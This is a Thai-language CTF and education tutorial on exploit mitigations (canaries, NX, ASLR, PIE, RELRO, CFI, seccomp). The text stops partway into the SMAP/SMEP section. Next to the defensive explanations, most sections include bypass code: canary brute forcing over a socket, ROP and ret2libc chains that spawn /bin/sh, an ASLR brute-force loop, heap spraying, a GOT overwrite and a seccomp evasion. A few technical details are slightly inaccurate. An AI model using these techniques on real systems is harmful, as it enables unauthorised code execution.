# Part 077: Security Defenses in Depth

## บทนำ (Introduction)

ในยุคปัจจุบัน การพัฒนาซอฟต์แวร์ที่ปลอดภัยต้องอาศัย "Defense in Depth" หรือการป้องกันแบบหลายชั้น แทนที่จะพึ่งกลไกเดียว ระบบปฏิบัติการสมัยใหม่และ compiler ได้นำเทคโนโลยีหลายอย่างมาใช้ร่วมกันเพื่อทำให้การโจมตียากขึ้น

ใน Part นี้เราจะศึกษา:
- Stack Canaries (SSP - Stack Smashing Protection)
- NX/DEP/W^X (Non-Executable Memory)
- ASLR (Address Space Layout Randomization)
- PIE (Position Independent Executable)
- RELRO (Relocation Read-Only)
- Fortify Source
- Safe Stack (LLVM)
- Shadow Stack (Intel CET)
- CFI (Control Flow Integrity)
- seccomp (Secure Computing Mode)
- SMAP/SMEP (Supervisor Mode Access/Execution Prevention)
- KPTI (Kernel Page-Table Isolation)
- checksec: การอ่านและตีความผลลัพธ์

**หมายเหตุ**: เนื้อหานี้มีไว้เพื่อการศึกษาและการทำ CTF (Capture The Flag) เท่านั้น

---

## ส่วนที่ 1: Stack Canaries / Stack Smashing Protection (SSP)

### 1.1 พื้นฐาน Stack Canary

Stack Canary เป็นค่าสุ่มที่วางไว้บน stack ระหว่าง local variables และ saved return address เปรียบเหมือน "นกขมิ้น" (canary) ในเหมืองถ่านหินที่จะตายก่อนถ้าก๊าซพิษรั่ว

```
Stack Layout กับ Canary:
+------------------------+
| Caller's frame         |
+------------------------+
| Return Address         |  <-- ถ้า overwrite นี้ = stack overflow
+------------------------+
| Saved RBP              |
+------------------------+
| CANARY VALUE           |  <-- ค่าสุ่ม, ตรวจสอบก่อน return
+------------------------+
| Local Variables        |
+------------------------+  <-- esp/rsp ชี้ที่นี่
| ...                    |
+------------------------+
```

ถ้าเกิด buffer overflow และ overwrite local variables → canary ถูก overwrite ด้วย → ตรวจพบก่อน return

### 1.2 วิธีเปิด/ปิด Stack Canary ใน GCC

```bash
# เปิด Stack Canary (default ใน GCC สมัยใหม่)
gcc -fstack-protector program.c -o program

# เปิดแบบเข้มงวดกว่า (ป้องกันทุก function)
gcc -fstack-protector-all program.c -o program

# เปิดแบบ strong (GCC 4.9+) - balance ระหว่าง performance และ security
gcc -fstack-protector-strong program.c -o program

# ปิด Stack Canary
gcc -fno-stack-protector program.c -o program
```

ความแตกต่างระหว่าง level:
- `-fstack-protector`: ป้องกันเฉพาะ function ที่มี array ขนาด >= 8 bytes
- `-fstack-protector-strong`: ป้องกัน function ที่มี array, address-taken variable, alloca()
- `-fstack-protector-all`: ป้องกันทุก function

### 1.3 Canary Value และ Placement

ค่า canary มักมีรูปแบบ:
- Byte แรกเป็น null byte (`\x00`) เพื่อป้องกัน string functions
- ค่าที่เหลือเป็น random

```c
// ตัวอย่าง canary value (64-bit):
// 0x00007f3d8a1b2c3d  <- byte แรก = 0x00 (null terminator trick)
```

การ generate canary:
```c
// Kernel สร้าง canary เมื่อ process เริ่มต้น
// เก็บไว้ใน TLS (Thread Local Storage)
// ตำแหน่ง: fs:0x28 (x86_64) หรือ gs:0x14 (x86_32)
```

### 1.4 Assembly ที่ GCC สร้างสำหรับ Canary

```asm
; Function prologue with canary (x86_64)
push    rbp
mov     rbp, rsp
sub     rsp, 0x30           ; allocate stack space
mov     rax, QWORD PTR fs:0x28  ; load canary from TLS
mov     QWORD PTR [rbp-0x8], rax ; store canary on stack
xor     eax, eax            ; clear rax (canary value not in registers)

; ... function body ...

; Function epilogue with canary check
mov     rax, QWORD PTR [rbp-0x8]  ; load canary from stack
xor     rax, QWORD PTR fs:0x28    ; XOR with original canary
je      .L_ok                      ; if match, continue
call    __stack_chk_fail           ; else call failure handler
.L_ok:
leave
ret
```

### 1.5 __stack_chk_fail

เมื่อ canary ถูก corrupt:

```c
// ใน glibc/sysdeps/posix/stack_chk_fail.c
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn))
__fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (do_abort, "*** %s ***: terminated\n", msg);
}
```

ผลลัพธ์ที่เห็น:
```
*** stack smashing detected ***: terminated
Aborted (core dumped)
```

### 1.6 TLS (Thread Local Storage) Canary Storage

```asm
; x86_64: canary อยู่ที่ fs:0x28
; fs segment register ชี้ไปที่ TLS area ของ thread นั้นๆ

; อ่าน canary:
mov rax, QWORD PTR fs:0x28

; ใน /proc/PID/maps จะเห็น [TLS] area
; แต่ละ thread มี canary ของตัวเอง
```

โครงสร้าง pthread TCB (Thread Control Block):
```
Offset 0x00: Self pointer
Offset 0x08: DTV pointer  
...
Offset 0x28: Stack Canary (x86_64)
...
```

### 1.7 วิธี Bypass Stack Canary

#### 1.7.1 Information Leak

```python
# Exploit scenario: อ่าน canary ก่อน overflow
# สมมติมี format string vulnerability

# ขั้นตอน:
# 1. หา offset ของ canary บน stack
# 2. ใช้ format string leak ค่า canary
# 3. ใช้ canary ที่ leak มาในการ overflow

# ตัวอย่าง format string leak:
payload = b"%7$p"  # อ่าน stack word ที่ 7
# หา offset ด้วย:
for i in range(1, 20):
    payload = f"%{i}$p".encode()
    # ส่งและวิเคราะห์ผลลัพธ์
```

```c
// Vulnerable program ที่ leak canary ได้:
void vuln() {
    char buf[64];
    read(0, buf, 200);  // overflow
    printf(buf);        // format string vulnerability - leak canary
    read(0, buf, 200);  // second overflow with known canary
}
```

#### 1.7.2 Brute Force (32-bit เท่านั้น)

ใน 32-bit system:
- Canary = 4 bytes = 32 bits
- Byte แรกเป็น null → เหลือ 3 bytes สุ่ม = 2^24 = 16 million possibilities
- ถ้า fork-based server (canary ไม่เปลี่ยนใน child) → brute force ทีละ byte ได้

```python
# Byte-by-byte brute force บน fork server (32-bit)
import socket
import struct

def try_canary_byte(sock, offset, known_bytes, test_byte):
    payload = b'A' * offset
    payload += known_bytes + bytes([test_byte])
    sock.send(payload)
    response = sock.recv(1024)
    return b"crashed" not in response  # ถ้าไม่ crash แสดงว่า byte ถูก

known_canary = b'\x00'  # null byte เสมอ
for byte_pos in range(3):
    for b in range(256):
        if try_canary_byte(sock, 64, known_canary, b):
            known_canary += bytes([b])
            break
```

#### 1.7.3 Overwrite ด้วยค่าเดิม (Same-value)

ถ้า leak ได้ ให้ใส่ค่า canary เดิมกลับไป:

```python
# หลังจาก leak canary:
canary = leaked_value  # ค่า 8 bytes ที่ได้จาก leak

# Overflow payload:
padding = b'A' * 64          # fill buffer
padding += canary             # canary ต้องตรงกับของเดิม
padding += b'B' * 8          # saved RBP
padding += p64(target_addr)  # return address
```

---

## ส่วนที่ 2: NX / DEP / W^X (Non-Executable Memory)

### 2.1 แนวคิดพื้นฐาน

NX (No-eXecute), DEP (Data Execution Prevention - Windows), W^X (Write XOR Execute - OpenBSD) คือการป้องกันไม่ให้ execute code ในพื้นที่ที่เป็น data

กฎหลัก: **หน่วยความจำแต่ละหน้าต้อง writable OR executable แต่ไม่ใช่ทั้งสอง**

### 2.2 การทำงานของ NX

```
Memory Permissions:
+------------------+-------+--------+-----------+
| Region           | Read  | Write  | Execute   |
+------------------+-------+--------+-----------+
| .text (code)     |  Yes  |  No    |  Yes      |
| .rodata          |  Yes  |  No    |  No       |
| .data/.bss       |  Yes  |  Yes   |  No  ← NX!|
| Stack            |  Yes  |  Yes   |  No  ← NX!|
| Heap             |  Yes  |  Yes   |  No  ← NX!|
+------------------+-------+--------+-----------+
```

โดยปกติถ้าไม่มี NX: shellcode บน stack execute ได้ → exploit ง่าย

### 2.3 Kernel และ Hardware Support

```
x86_64:
- CPU มี NX bit (bit 63 ใน Page Table Entry)
- AMD เรียกว่า NX (No-eXecute)
- Intel เรียกว่า XD (eXecute Disable)

ARM:
- XN (eXecute Never) bit ใน page table
```

kernel ตั้งค่า:
```bash
# ดู NX status:
dmesg | grep NX
# output: NX (Execute Disable) protection: active

# ใน /proc/cpuinfo:
flags : ... nx ...
```

### 2.4 exec-shield (Historical)

exec-shield เป็น kernel patch สำหรับ Linux เก่าๆ (ก่อน NX hardware):

```
exec-shield ทำงานโดย:
1. ป้องกัน execution ของ stack/heap ด้วย software
2. Randomize library base addresses (precursor ของ ASLR)
3. ปิด high addresses ที่ไม่จำเป็น
```

ปัจจุบัน hardware NX แทน exec-shield แล้ว

### 2.5 การเปิด/ปิด NX ในโปรแกรม

```bash
# เปิด NX (default)
gcc program.c -o program

# ปิด NX (executable stack - อันตราย!)
gcc -z execstack program.c -o program

# ดู NX status ของ binary:
readelf -l program | grep GNU_STACK
# RWE = executable stack (no NX)
# RW  = non-executable stack (NX enabled)

# หรือใช้ checksec:
checksec --file=program
```

### 2.6 mmap และ mprotect

```c
// mmap พื้นที่ executable:
void *mem = mmap(NULL, 4096, 
                 PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

// mprotect เปลี่ยน permissions:
// JIT compilers ทำแบบนี้: write code แล้ว mprotect เป็น EXEC
mprotect(mem, 4096, PROT_READ | PROT_EXEC);
```

### 2.7 Bypass NX: ROP Chains (Return-Oriented Programming)

เมื่อ NX ป้องกัน execute code ใหม่ → ใช้ code ที่มีอยู่แล้ว!

ROP ทำงานอย่างไร:
1. หา "gadgets" - sequences สั้นๆ ที่จบด้วย `ret`
2. Chain gadgets เข้าด้วยกันโดย overflow return addresses
3. Execute logic ที่ต้องการโดยไม่ต้อง inject code ใหม่

```asm
; Gadget ตัวอย่าง:
; ที่อยู่ 0x401234:
pop rdi
ret

; ที่อยู่ 0x401256:
pop rsi
pop rdx
ret

; ที่อยู่ 0x401278:
syscall
ret
```

```python
# ROP Chain ตัวอย่าง (execve("/bin/sh", NULL, NULL)):
from pwn import *

elf = ELF('./program')

# หา gadgets:
pop_rdi = 0x401234    # pop rdi; ret
pop_rsi_rdx = 0x401256  # pop rsi; pop rdx; ret  
syscall = 0x401278    # syscall; ret

# /bin/sh string address
bin_sh = next(elf.search(b'/bin/sh'))

# สร้าง chain:
payload = b'A' * 64          # padding
payload += p64(pop_rdi)      # gadget 1
payload += p64(bin_sh)       # argument: /bin/sh
payload += p64(pop_rsi_rdx)  # gadget 2
payload += p64(0)            # NULL
payload += p64(0)            # NULL
payload += p64(syscall)      # syscall (execve)
```

### 2.8 ret2libc

วิธีง่ายกว่า ROP: เรียก libc functions โดยตรง

```python
# ret2libc: call system("/bin/sh")
from pwn import *

elf = ELF('./program')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# หา addresses:
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
pop_rdi = 0x401234

payload = b'A' * 64
payload += p64(pop_rdi)      # set rdi = address of "/bin/sh"
payload += p64(bin_sh_addr)  
payload += p64(system_addr)  # call system()
```

---

## ส่วนที่ 3: ASLR (Address Space Layout Randomization)

### 3.1 แนวคิด ASLR

ASLR ทำให้ layout ของ address space สุ่มทุกครั้งที่ process เริ่มต้น ทำให้ผู้โจมตีไม่รู้ว่า addresses ต่างๆ อยู่ที่ไหน

พื้นที่ที่ถูก randomize:
- Stack base address
- Heap base address  
- Library (libc, etc.) load address
- mmap() allocations

```
ไม่มี ASLR:
Process 1: stack at 0x7ffffffde000
Process 2: stack at 0x7ffffffde000  ← same!

มี ASLR:
Process 1: stack at 0x7f3a2b1cd000
Process 2: stack at 0x7e9c4d8ef000  ← different!
```

### 3.2 /proc/sys/kernel/randomize_va_space

```bash
# ดูค่า ASLR ปัจจุบัน:
cat /proc/sys/kernel/randomize_va_space

# ค่าที่เป็นไปได้:
# 0 = ปิด ASLR ทั้งหมด
# 1 = randomize stack, mmap, VDSO
# 2 = randomize stack, mmap, VDSO, heap (default ใน Linux)

# เปลี่ยนค่า (ต้องเป็น root):
echo 0 > /proc/sys/kernel/randomize_va_space  # ปิด (ใช้ใน CTF)
echo 2 > /proc/sys/kernel/randomize_va_space  # เปิด (default)

# หรือใช้ sysctl:
sysctl -w kernel.randomize_va_space=0
```

### 3.3 Entropy Bits

จำนวน bits ที่สุ่มกำหนดความแข็งแกร่งของ ASLR:

```
x86_64 Linux:
- Stack: ~28 bits entropy
- mmap (libraries): ~28 bits entropy  
- Heap: ~13 bits entropy

x86 (32-bit) Linux:
- Stack: ~8 bits entropy  ← น้อยมาก!
- mmap: ~8 bits entropy   ← น้อยมาก!
- Heap: ~13 bits entropy

ดู entropy:
dmesg | grep -i aslr
cat /proc/self/maps  # ดู actual addresses
```

### 3.4 ตรวจสอบ ASLR ด้วย Python

```python
import subprocess

# รันโปรแกรมหลายครั้งและดู addresses:
for i in range(5):
    result = subprocess.run(
        ['python3', '-c', 
         'import ctypes; print(hex(ctypes.CDLL("libc.so.6")._handle))'],
        capture_output=True, text=True
    )
    print(f"Run {i}: {result.stdout.strip()}")

# Output กับ ASLR:
# Run 0: 0x7f8a3b2c1000
# Run 1: 0x7f6d9e4f2000
# Run 2: 0x7f1b2c3d4000
```

### 3.5 Bypass ASLR

#### 3.5.1 Brute Force (32-bit)

ใน 32-bit system entropy น้อยมาก:

```python
# 32-bit: stack ~8 bits entropy = 256 possibilities
# ส่ง payload ซ้ำๆ จนกว่าจะโดนที่ถูก

import socket
import time

TARGET_ADDR = 0xbfffffff  # guess stack address
TRIES = 256

for attempt in range(TRIES):
    try:
        s = socket.socket()
        s.connect(('target', 1337))
        
        # ส่ง payload พร้อม guessed address
        payload = b'A' * 100 + p32(TARGET_ADDR - attempt * 0x1000)
        s.send(payload)
        
        if b'shell' in s.recv(100):
            print(f"Success on attempt {attempt}!")
            break
    except:
        pass
```

#### 3.5.2 Information Leak

วิธีที่น่าเชื่อถือกว่า: leak address แล้วคำนวณ base

```python
# Format string vulnerability leak:
def leak_address(offset):
    payload = f"%{offset}$p".encode()
    # ส่งและรับค่า

# Stack leak → คำนวณ stack address อื่นๆ
stack_leak = leak_address(N)  # leaked stack address
target = stack_leak - OFFSET  # คำนวณ target

# Library leak → คำนวณ libc base
libc_leak = leak_address(M)   # leaked libc address
libc_base = libc_leak - SYMBOL_OFFSET  # คำนวณ base
system_addr = libc_base + libc.symbols['system']
```

#### 3.5.3 Heap Spray

เต็ม heap ด้วย shellcode/payload หลายๆ ที่:

```python
# Heap spray: ใส่ shellcode/payload ทุกที่ใน heap
# เพิ่มโอกาสที่ random address จะชี้ไป payload

NOP_SLED = b'\x90' * 4096  # NOP sled
SHELLCODE = b'\x31\xc0...'  # actual shellcode

# Spray หลายๆ chunk:
for i in range(1000):
    alloc_buffer(NOP_SLED + SHELLCODE)

# guess address ตรงกลาง heap:
GUESS = heap_base + (heap_size // 2)
```

---

## ส่วนที่ 4: PIE (Position Independent Executable)

### 4.1 แนวคิด PIE

โดยปกติ executable binary ถูก link ให้ load ที่ address คงที่ (เช่น 0x400000):
```
ไม่มี PIE:
text segment: 0x400000 ← คงที่เสมอ!
```

PIE ทำให้ executable สามารถ load ที่ address ใดก็ได้ เหมือน shared library → ASLR สามารถ randomize executable base ได้ด้วย

```
มี PIE + ASLR:
Process 1 text: 0x555dc7800000
Process 2 text: 0x556ab1200000
```

### 4.2 การ Compile ด้วย PIE

```bash
# เปิด PIE:
gcc -fpie -pie program.c -o program

# ปิด PIE:
gcc -no-pie program.c -o program

# ดู PIE status:
file program
# "ELF 64-bit LSB pie executable" = PIE enabled
# "ELF 64-bit LSB executable" = PIE disabled

readelf -h program | grep Type
# DYN = PIE
# EXEC = no PIE
```

### 4.3 วิธีทำงานของ PIE

PIE ใช้ PC-relative addressing แทน absolute:

```asm
; ไม่มี PIE (absolute):
mov rax, [0x601020]   ; absolute address

; มี PIE (RIP-relative):
mov rax, [rip + 0x200fe0]  ; relative to current instruction
; ทำงานได้ที่ address ใดก็ได้
```

### 4.4 Bypass PIE

ต้อง leak executable base address ก่อน:

```python
# Leak ค่าใดๆ ที่ชี้ไปใน executable:
leaked = leak_from_stack_or_format_string()

# คำนวณ base (ต้องรู้ offset ของ symbol ที่ leak):
exe_base = leaked - SYMBOL_OFFSET  # offset จาก binary analysis
exe_base &= 0xfffffffffffff000     # page-align (ล่าง 12 bits เป็น 0)

# ตอนนี้คำนวณ addresses อื่นๆ ได้:
win_func = exe_base + 0x1234  # offset จาก binary
```

```bash
# หา offset ของ symbols ใน PIE binary:
objdump -d program | grep '<win>'
# 0000000000001234 <win>:  ← offset = 0x1234

# หรือใช้ pwntools:
from pwn import *
elf = ELF('./program')
win_offset = elf.symbols['win']  # 0x1234
```

---

## ส่วนที่ 5: RELRO (Relocation Read-Only)

### 5.1 GOT (Global Offset Table) คืออะไร

GOT เป็นตารางที่เก็บ addresses ของ external functions (จาก libc, etc.) ที่ resolve ตอน runtime:

```
ELF Binary Structure:
+------------------+
| .plt             |  Procedure Linkage Table
| .got.plt         |  Global Offset Table  ← เก็บ addresses
| .text            |  Code
| .data            |
| .bss             |
+------------------+

การทำงาน (Lazy Binding):
1. program เรียก printf@plt
2. .plt เช็ค .got.plt[printf]
3. ครั้งแรก: ยังไม่ resolved → เรียก dynamic linker
4. Dynamic linker หา printf address แล้วเขียนลง .got.plt
5. ครั้งต่อไป: .got.plt มีค่าแล้ว → jump ตรงๆ
```

### 5.2 Partial RELRO

```bash
# เปิด Partial RELRO (default ใน GCC สมัยใหม่):
gcc -Wl,-z,relro program.c -o program

# Partial RELRO:
# - .init_array, .fini_array, .jcr, .dynamic → read-only
# - .got.plt ยังเป็น WRITE! ← ช่องโหว่
```

ผลลัพธ์ readelf:
```bash
readelf -S program | grep -E "got|relro"
# .got.plt    PROGBITS  ...  WA   ← Writable!
```

### 5.3 Full RELRO

```bash
# เปิด Full RELRO:
gcc -Wl,-z,relro,-z,now program.c -o program

# Full RELRO:
# - Resolve ALL symbols ตอน load time (eager binding)
# - .got.plt ทั้งหมด → read-only ← ไม่สามารถ overwrite!
```

ผลลัพธ์:
```bash
readelf -S program | grep got
# .got    PROGBITS  ...  A    ← Read-only (no W flag)
```

### 5.4 Bypass Partial RELRO: GOT Overwrite

ถ้ามี write-what-where vulnerability + Partial RELRO:

```python
# GOT overwrite: เปลี่ยน address ใน GOT table
# สมมติ: program เรียก printf แล้วเรียก exit
# ถ้า overwrite got[exit] ด้วย system address...

# หา GOT address ของ exit:
# objdump -R program | grep exit
# 0x601050 R_X86_64_JUMP_SLOT  exit

exit_got = 0x601050
system_addr = libc_base + libc.symbols['system']

# Write: [exit_got] = system_addr
write_primitive(exit_got, system_addr)

# เมื่อ program เรียก exit("/bin/sh")... 
# จริงๆ แล้วจะเรียก system("/bin/sh")!
```

### 5.5 ทำไม Full RELRO ป้องกัน GOT Overwrite

```
Full RELRO flow:
1. Dynamic linker resolve ทุก symbol ตอน load
2. จากนั้น mprotect .got เป็น PROT_READ
3. ถ้าพยายาม write ไปที่ .got → SIGSEGV

แต่ RELRO ไม่ได้ป้องกัน:
- .data overwrite
- Heap corruption  
- Use-after-free
```

---

## ส่วนที่ 6: Fortify Source

### 6.1 คืออะไร

`__FORTIFY_SOURCE` เป็น macro ที่ทำให้ compiler แทนที่ unsafe functions ด้วย versions ที่ตรวจสอบ bounds:

```c
// ไม่มี Fortify:
strcpy(dest, src);  // ไม่ตรวจ size!

// มี Fortify:
__strcpy_chk(dest, src, sizeof(dest));  // ตรวจสอบ!
```

### 6.2 ใช้งาน

```bash
# เปิด Fortify Source level 1:
gcc -D_FORTIFY_SOURCE=1 -O1 program.c -o program

# เปิด Fortify Source level 2 (เข้มงวดกว่า):
gcc -D_FORTIFY_SOURCE=2 -O2 program.c -o program

# หมายเหตุ: ต้องมี -O1 หรือสูงกว่า ถึงจะทำงาน
```

### 6.3 Functions ที่ถูก Fortify

```c
// Functions ที่มี fortified version:
memcpy    → __memcpy_chk
memmove   → __memmove_chk
memset    → __memset_chk
strcpy    → __strcpy_chk
strcat    → __strcat_chk
sprintf   → __sprintf_chk
snprintf  → __snprintf_chk
gets      → __gets_chk  (หรือห้ามใช้เลย)
fgets     → __fgets_chk
printf    → __printf_chk
```

### 6.4 Level 1 vs Level 2

```
Level 1 (-D_FORTIFY_SOURCE=1):
- Runtime checks
- Compile-time warnings สำหรับ obvious issues
- ไม่ตรวจ format string

Level 2 (-D_FORTIFY_SOURCE=2):  
- ทุกอย่างใน Level 1
- ตรวจ format string (ห้ามใช้ %n กับ writable format)
- เข้มงวดกว่าในการตรวจ size
```

### 6.5 ตัวอย่างที่ Fortify ตรวจพบ

```c
#include <string.h>

void vuln() {
    char buf[10];
    strcpy(buf, "This is way too long for the buffer!");
    // With _FORTIFY_SOURCE=2:
    // *** buffer overflow detected ***: terminated
    // Aborted (core dumped)
}
```

### 6.6 Limitations ของ Fortify

```c
// Fortify ทำงานได้เฉพาะเมื่อรู้ size ตอน compile time:
char buf[10];
strcpy(buf, src);  // รู้ว่า buf = 10 bytes → ตรวจได้

// ไม่ทำงานกับ:
char *buf = malloc(10);
strcpy(buf, src);  // ไม่รู้ size ตอน compile → ไม่ตรวจ

// ไม่ป้องกัน off-by-one ทุกกรณี
```

---

## ส่วนที่ 7: Safe Stack (LLVM)

### 7.1 แนวคิด Safe Stack

Safe Stack แยก stack ออกเป็น 2 ส่วน:

```
Safe Stack (ใช้ LLVM/Clang):

Normal Stack (Unsafe):          Safe Stack:
+------------------+            +------------------+
| Local arrays     |            | Return addresses |
| Large buffers    |            | Saved registers  |
| Vulnerable data  |            | Spilled pointers |
+------------------+            +------------------+

ถ้า overflow บน unsafe stack → ไม่สามารถ overwrite return address
```

### 7.2 ใช้งาน

```bash
# เปิด Safe Stack ด้วย Clang:
clang -fsanitize=safe-stack program.c -o program

# ตรวจสอบ:
nm program | grep __safestack
```

### 7.3 วิธีทำงาน

```c
// Clang สร้าง code ประมาณนี้:
void *unsafe_stack_ptr;  // pointer ไปยัง unsafe stack
// Safe stack = normal stack register (rsp)

// Local arrays → unsafe stack
// Return addresses → safe stack

// ถ้า overflow local array → corrupt unsafe stack เท่านั้น
// Return address ยังปลอดภัยอยู่บน safe stack
```

### 7.4 ข้อจำกัด

- ใช้ได้เฉพาะกับ Clang (ไม่ใช่ GCC)
- overhead เล็กน้อย
- ไม่ป้องกัน heap overflow
- ไม่ป้องกัน use-after-free

---

## ส่วนที่ 8: Shadow Stack (Intel CET)

### 8.1 CET (Control-flow Enforcement Technology)

Intel CET เป็น hardware feature ที่มีใน processor รุ่นใหม่ (Tiger Lake+):

Components:
1. **Shadow Stack (SS)**: ป้องกัน return address tampering
2. **Indirect Branch Tracking (IBT)**: ป้องกัน indirect jumps/calls

### 8.2 Shadow Stack ทำงานอย่างไร

```
ปกติ:           Shadow Stack:
+----------+    +----------+
| ret addr |    | ret addr |  ← hardware copy
+----------+    +----------+
| saved RBP|    
+----------+    

CALL:
- push return address ลง regular stack
- push return address ลง shadow stack (hardware-managed)

RET:
- pop จาก regular stack
- pop จาก shadow stack  
- เปรียบเทียบ: ถ้าไม่ตรงกัน → #CP exception (Control-Protection)
```

### 8.3 Kernel Support

```bash
# ดู CET support:
cat /proc/cpuinfo | grep -i cet
# flags: ... shstk ibt ...

# Linux kernel 5.18+ รองรับ Shadow Stack
# เปิดใช้ด้วย:
# prctl(PR_SET_SHADOW_STACK_STATUS, PR_SHADOW_STACK_ENABLE, ...)
```

### 8.4 Compiler Support

```bash
# GCC 10+ / Clang 14+:
gcc -fcf-protection=return program.c -o program   # shadow stack
gcc -fcf-protection=branch program.c -o program   # IBT
gcc -fcf-protection=full program.c -o program     # ทั้งคู่

# ดูว่า binary มี CET:
readelf -n program | grep -i cet
```

### 8.5 ทำไม CET แข็งแกร่ง

```
Traditional stack overflow:
1. Overflow buffer
2. Overwrite return address บน regular stack
3. RET → jump ไปยัง attacker-controlled address

กับ Shadow Stack:
1. Overflow buffer
2. Overwrite return address บน regular stack
3. RET → เปรียบเทียบกับ shadow stack → ไม่ตรงกัน!
4. → #CP Exception → process terminated

Shadow stack อยู่ใน separate, protected memory region
User code ไม่สามารถ write ไปที่ shadow stack ได้โดยตรง
```

---

## ส่วนที่ 9: CFI (Control Flow Integrity)

### 9.1 แนวคิด CFI

CFI ป้องกัน indirect control flow transfers ที่ไม่ถูกต้อง:
- Indirect calls: `call [rax]`, `call rcx`
- Indirect jumps: `jmp [rax]`

```
Attack ที่ CFI ป้องกัน:
- Virtual function pointer hijacking (vtable attacks in C++)
- Function pointer overwrite
- longjmp target manipulation
```

### 9.2 Forward Edge vs Backward Edge

```
Forward Edge:
- Call/Jump ไปหน้า (forward ใน control flow graph)
- Examples: function calls, indirect jumps
- CFI ตรวจว่า target เป็น valid function entry point

Backward Edge:
- Return (backward ใน control flow graph)
- Examples: RET instruction
- Shadow Stack ป้องกัน backward edge
```

### 9.3 LLVM CFI

```bash
# เปิด LLVM CFI ด้วย Clang:
clang -flto -fvisibility=hidden -fsanitize=cfi program.c -o program

# CFI types:
-fsanitize=cfi-icall        # indirect calls
-fsanitize=cfi-vcall        # C++ virtual calls
-fsanitize=cfi-nvcall       # C++ non-virtual member calls
-fsanitize=cfi-derived-cast # C++ derived casts
-fsanitize=cfi-unrelated-cast  # C++ unrelated casts
```

### 9.4 วิธีทำงาน

```c
// ไม่มี CFI:
void (*func_ptr)(void) = get_function_pointer();
func_ptr();  // ถ้า func_ptr ถูก corrupt → execute arbitrary code

// มี CFI:
// Compiler สร้าง type check ก่อน indirect call:
if (!__cfi_check_type(func_ptr, expected_type)) {
    __cfi_slowpath(func_ptr, expected_type);  // report violation
}
func_ptr();
```

### 9.5 CFI + LTO

CFI ต้องการ LTO (Link Time Optimization) เพื่อรู้ type information ทั้งหมด:

```bash
# ต้องใช้ LTO:
clang -flto -fsanitize=cfi program.c utils.c -o program
# ไม่ใช้ LTO → CFI ทำงานไม่ได้เต็มที่
```

---

## ส่วนที่ 10: seccomp (Secure Computing Mode)

### 10.1 คืออะไร

seccomp เป็น kernel feature ที่กรอง system calls ที่ process สามารถทำได้:

```
ปกติ: process สามารถเรียก syscall ใดก็ได้
      → execve("/bin/sh") → shell ได้

seccomp: กำหนด whitelist/blacklist ของ syscalls
         → ถ้าเรียก syscall ที่ห้าม → killed หรือ error
```

### 10.2 seccomp Modes

```c
// Mode 1: strict mode
// อนุญาตเฉพาะ: read, write, exit, sigreturn
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);

// Mode 2: filter mode (BPF-based)  
// กำหนด custom rules ด้วย BPF programs
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
```

### 10.3 seccomp-bpf Programs

```c
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>

// ตัวอย่าง: อนุญาตเฉพาะ read, write, exit
struct sock_filter filter[] = {
    // Load syscall number
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 
             offsetof(struct seccomp_data, nr)),
    
    // Allow read (0)
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    
    // Allow write (1)
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    
    // Allow exit (60)
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    
    // Kill everything else
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
};

struct sock_fprog prog = {
    .len = sizeof(filter) / sizeof(filter[0]),
    .filter = filter,
};

prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
```

### 10.4 ใช้ libseccomp

```c
#include <seccomp.h>

// ง่ายกว่า BPF โดยตรง:
scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);  // default: kill

// Allow specific syscalls:
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

// Load filter:
seccomp_load(ctx);
seccomp_release(ctx);
```

### 10.5 การ Dump และวิเคราะห์ seccomp Rules

```bash
# ดู seccomp rules ของ process:
# ต้องใช้ seccomp-tools หรือ strace

# ดึง seccomp filter dump ด้วย strace:
strace -f -e trace=prctl,seccomp ./program

# ใช้ seccomp-tools (Python):
pip install seccomp-tools
seccomp-tools dump ./program
```

### 10.6 Bypass seccomp

```
วิธี Bypass:
1. หา syscall ที่ยังไม่ได้ block (เช่น openat แทน open)
2. ใช้ 32-bit syscall numbers บน 64-bit process
3. Time-of-check/time-of-use race conditions
4. seccomp ไม่ apply กับ threads ที่มีอยู่ก่อน (ขึ้นกับ version)

ตัวอย่าง: ถ้า block execve แต่ไม่ block execveat:
execveat(AT_FDCWD, "/bin/sh", argv, envp, 0);
```

### 10.7 ตัวอย่างใน CTF

```python
# CTF: seccomp ไม่อนุญาต execve
# แต่ยังอนุญาต read/write/open
# ใช้ open-read-write chain แทน:

# /flag.txt → fd=3
open_payload = b"/flag.txt\x00"

# ROP chain:
# open("/flag.txt", O_RDONLY)
# read(3, buf, 100) 
# write(1, buf, 100)
```

---

## ส่วนที่ 11: SMAP และ SMEP

### 11.1 SMEP (Supervisor Mode Execution Prevention)

```
SMEP ป้องกัน:
- Kernel (Ring 0) ไม่สามารถ execute code ใน user-space pages
- Intel: CR4.SMEP bit (bit 20)
- AMD: CR4.SMEP bit (ชื่อเหมือนกัน)

Attack ที่ป้องกัน:
ก่อน SMEP: kernel exploit → mmap shellcode → redirect kernel execution ไปที่นั้น
หลัง SMEP: kernel พยายาม execute user page → #PF (Protection Fault)
```

